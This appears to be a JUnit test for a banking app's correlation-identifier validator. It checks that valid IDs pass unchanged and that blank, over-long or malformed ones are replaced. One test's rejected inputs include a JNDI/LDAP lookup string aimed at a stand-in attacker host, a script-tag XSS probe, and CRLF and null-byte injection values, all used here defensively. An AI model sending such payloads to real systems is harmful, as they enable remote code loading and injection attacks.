package com.bancoelcapital.app;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;

/**
 * Correlation identifier contract (ADR-12 Acceptance Supplement): validate or replace, never
 * reject. HTTP propagation, the response echo and the MDC lifecycle belong to later phases.
 */
class CorrelationIdsTest {

  @Test
  void keepsValidIncomingValuesVerbatim() {
    String[] valid = {"a", "A1", "abc-123_ok.test", "0", "a".repeat(CorrelationIds.MAX_LENGTH)};

    for (String candidate : valid) {
      assertThat(CorrelationIds.isValid(candidate)).as(candidate).isTrue();
      assertThat(CorrelationIds.resolve(candidate)).isEqualTo(candidate);
    }
  }

  @Test
  void enforcesTheLengthBoundAtItsEdges() {
    assertThat(CorrelationIds.isValid("a")).isTrue();
    assertThat(CorrelationIds.isValid("a".repeat(CorrelationIds.MAX_LENGTH))).isTrue();
    assertThat(CorrelationIds.isValid("a".repeat(CorrelationIds.MAX_LENGTH + 1))).isFalse();
  }

  @Test
  void replacesAbsentAndBlankValues() {
    for (String absent : new String[] {null, "", " ", "   "}) {
      assertThat(CorrelationIds.isValid(absent)).isFalse();

      String resolved = CorrelationIds.resolve(absent);

      assertThat(CorrelationIds.isValid(resolved)).isTrue();
      assertThat(resolved).isNotBlank();
    }
  }

  @Test
  void replacesValuesWithDisallowedCharacters() {
    String[] rejected = {
      "bad id",
      "bad/id",
      "bad\\id",
      "bad:id",
      "bad;id",
      "bad,id",
      "bad=id",
      "bad+id",
      "bad%20id",
      "caf\u00e9",
      "a\tb",
      "a\nb",
      "abc\r\n",
      "${jndi:ldap://attacker/x}",
      "<script>alert(1)</script>",
      "a\0b"
    };

    for (String candidate : rejected) {
      assertThat(CorrelationIds.isValid(candidate)).as(candidate).isFalse();

      String resolved = CorrelationIds.resolve(candidate);

      assertThat(CorrelationIds.isValid(resolved)).as(candidate).isTrue();
      assertThat(resolved).isNotEqualTo(candidate);
    }
  }

  @Test
  void replacesValuesOutsideTheLengthBound() {
    String tooLong = "a".repeat(CorrelationIds.MAX_LENGTH + 1);

    assertThat(CorrelationIds.isValid(tooLong)).isFalse();

    String resolved = CorrelationIds.resolve(tooLong);

    assertThat(CorrelationIds.isValid(resolved)).isTrue();
    assertThat(resolved).isNotEqualTo(tooLong);
  }

  @Test
  void neverThrowsOnExtremeInputAndAlwaysProducesAValidIdentifier() {
    String[] extreme = {"a".repeat(10_000), "\uD83D\uDE00", "\0"};

    for (String candidate : extreme) {
      String resolved = CorrelationIds.resolve(candidate);

      assertThat(CorrelationIds.isValid(resolved)).as(candidate).isTrue();
    }
  }

  @Test
  void generatedIdentifiersAreValidAndDistinct() {
    String first = CorrelationIds.generate();
    String second = CorrelationIds.generate();

    assertThat(CorrelationIds.isValid(first)).isTrue();
    assertThat(CorrelationIds.isValid(second)).isTrue();
    assertThat(first).isNotEqualTo(second);
  }

  @Test
  void aGeneratedIdentifierIsItselfAcceptedAsIncoming() {
    String generated = CorrelationIds.generate();

    assertThat(CorrelationIds.resolve(generated)).isEqualTo(generated);
  }
}
